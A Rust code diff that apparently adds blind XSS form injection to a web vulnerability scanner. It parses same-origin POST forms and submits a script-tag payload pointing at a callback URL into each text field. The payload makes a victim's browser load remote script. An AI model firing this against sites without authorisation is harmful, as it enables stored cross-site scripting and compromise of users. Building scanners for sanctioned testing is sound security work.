@@ -157,5 +157,217 @@ async fn send_blind_request(target: &Target, param_name: &str, payload: &str, pa
     }
 }
 
+/// Discover HTML `<form>` elements on the target page and submit the Blind XSS
+/// payload to each same-origin POST form, one request per injectable text-like
+/// field. Non-text inputs (hidden, file, submit, button, image, reset,
+/// checkbox, radio) and `<select>` keep their original value so CSRF tokens
+/// and similar state survive the injection.
+///
+/// GET forms are skipped because their fields overlap with the existing
+/// query-param blind injection in [`blind_scanning`]. Cross-origin form
+/// actions are skipped to avoid unintended outbound requests. Multipart
+/// forms are also skipped in this first pass.
+pub async fn blind_scan_forms(target: &Target, callback_url: &str) {
+    use tokio::time::{Duration, sleep};
+    use url::form_urlencoded;
+
+    let template = crate::payload::XSS_BLIND_PAYLOADS
+        .first()
+        .copied()
+        .unwrap_or("\"'><script src={}></script>");
+    let payload = template.replace("{}", callback_url);
+
+    let client = target.build_client_or_default();
+    let cookie_header = build_cookie_header(&target.cookies);
+
+    // Always GET the form-bearing page. Reusing target.method would POST to
+    // the form handler instead of fetching the landing page that renders the
+    // form, mirroring discovery::probe_html_forms.
+    let mut fetch = client.get(target.url.clone());
+    for (k, v) in &target.headers {
+        fetch = fetch.header(k, v);
+    }
+    if let Some(ua) = &target.user_agent {
+        fetch = fetch.header("User-Agent", ua);
+    }
+    if let Some(ref h) = cookie_header {
+        fetch = fetch.header("Cookie", h);
+    }
+    crate::tick_request_count();
+    let html = match fetch.send().await {
+        Ok(resp) => match resp.text().await {
+            Ok(text) => text,
+            Err(_) => return,
+        },
+        Err(_) => return,
+    };
+
+    // Parse forms in a tight scope so `scraper::Html` (which is !Send) never
+    // escapes across an await boundary.
+    struct FormField {
+        name: String,
+        value: String,
+        injectable: bool,
+    }
+    struct FormInfo {
+        action: url::Url,
+        fields: Vec<FormField>,
+    }
+    let forms: Vec<FormInfo> = {
+        let document = scraper::Html::parse_document(&html);
+        let form_sel = crate::scanning::selectors::form();
+        let input_sel = crate::scanning::selectors::input_textarea_select();
+
+        let mut out = Vec::new();
+        for form in document.select(form_sel) {
+            let method = form.value().attr("method").unwrap_or("get");
+            if !method.eq_ignore_ascii_case("post") {
+                continue;
+            }
+            let enctype = form.value().attr("enctype").unwrap_or("");
+            if enctype.eq_ignore_ascii_case("multipart/form-data") {
+                continue;
+            }
+
+            let action_attr = form.value().attr("action").unwrap_or("");
+            let action_url = if action_attr.is_empty() || action_attr == "#" {
+                target.url.clone()
+            } else {
+                match target.url.join(action_attr) {
+                    Ok(u) => u,
+                    Err(_) => continue,
+                }
+            };
+
+            if !is_same_origin(&target.url, &action_url) {
+                continue;
+            }
+
+            let mut fields: Vec<FormField> = Vec::new();
+            for input in form.select(input_sel) {
+                let name = input.value().attr("name").unwrap_or("").to_string();
+                if name.is_empty() {
+                    continue;
+                }
+                let value = input.value().attr("value").unwrap_or("").to_string();
+                let injectable = is_injectable_input(&input);
+                fields.push(FormField {
+                    name,
+                    value,
+                    injectable,
+                });
+            }
+            if !fields.iter().any(|f| f.injectable) {
+                continue;
+            }
+
+            out.push(FormInfo {
+                action: action_url,
+                fields,
+            });
+        }
+        out
+    };
+
+    for FormInfo { action, fields } in forms {
+        for field_idx in 0..fields.len() {
+            if !fields[field_idx].injectable {
+                continue;
+            }
+            let body = fields
+                .iter()
+                .enumerate()
+                .map(|(i, f)| {
+                    let value = if i == field_idx { &payload } else { &f.value };
+                    let enc_n =
+                        form_urlencoded::byte_serialize(f.name.as_bytes()).collect::<String>();
+                    let enc_v =
+                        form_urlencoded::byte_serialize(value.as_bytes()).collect::<String>();
+                    format!("{}={}", enc_n, enc_v)
+                })
+                .collect::<Vec<_>>()
+                .join("&");
+
+            let mut request = client.post(action.clone());
+            for (k, v) in &target.headers {
+                // Skip Content-Type from caller-supplied headers so we don't
+                // emit a second value that conflicts with the urlencoded body.
+                if k.eq_ignore_ascii_case("content-type") {
+                    continue;
+                }
+                request = request.header(k, v);
+            }
+            // Set Content-Type last to guarantee it wins.
+            request = request.header("Content-Type", "application/x-www-form-urlencoded");
+            if let Some(ua) = &target.user_agent {
+                request = request.header("User-Agent", ua);
+            }
+            if let Some(ref h) = cookie_header {
+                request = request.header("Cookie", h);
+            }
+            request = request.body(body);
+
+            crate::tick_request_count();
+            if let Err(e) = request.send().await
+                && crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed)
+            {
+                eprintln!(
+                    "[DBG] blind form request failed action={} field_idx={}: {}",
+                    action, field_idx, e
+                );
+            }
+
+            if target.delay > 0 {
+                sleep(Duration::from_millis(target.delay)).await;
+            }
+        }
+    }
+}
+
+/// Build a `Cookie:` header value once, returning None if the target has no
+/// cookies configured.
+fn build_cookie_header(cookies: &[(String, String)]) -> Option<String> {
+    if cookies.is_empty() {
+        return None;
+    }
+    Some(
+        cookies
+            .iter()
+            .map(|(k, v)| format!("{}={}", k, v))
+            .collect::<Vec<_>>()
+            .join("; "),
+    )
+}
+
+/// Returns true when an `input`/`textarea`/`select` node accepts free-form
+/// user-controlled text, so substituting the Blind XSS payload there makes
+/// sense. Non-text-bearing inputs (hidden, file, submit, button, image,
+/// reset, checkbox, radio) and `<select>` keep their original value so CSRF
+/// tokens and option choices survive.
+fn is_injectable_input(el: &scraper::element_ref::ElementRef<'_>) -> bool {
+    let tag = el.value().name();
+    if tag.eq_ignore_ascii_case("textarea") {
+        return true;
+    }
+    if !tag.eq_ignore_ascii_case("input") {
+        // `<select>` and anything else: not free-form text.
+        return false;
+    }
+    // <input> defaults to type="text" when the attribute is missing or
+    // unrecognized. Treat the well-known text-bearing types as injectable.
+    let ty = el.value().attr("type").unwrap_or("text");
+    matches!(
+        ty.to_ascii_lowercase().as_str(),
+        "text" | "search" | "url" | "email" | "tel" | "password" | "number"
+    )
+}
+
+/// Same-origin check: scheme + host + port must match.
+fn is_same_origin(a: &url::Url, b: &url::Url) -> bool {
+    a.scheme() == b.scheme()
+        && a.host_str() == b.host_str()
+        && a.port_or_known_default() == b.port_or_known_default()
+}
+
 #[cfg(test)]
 mod tests;
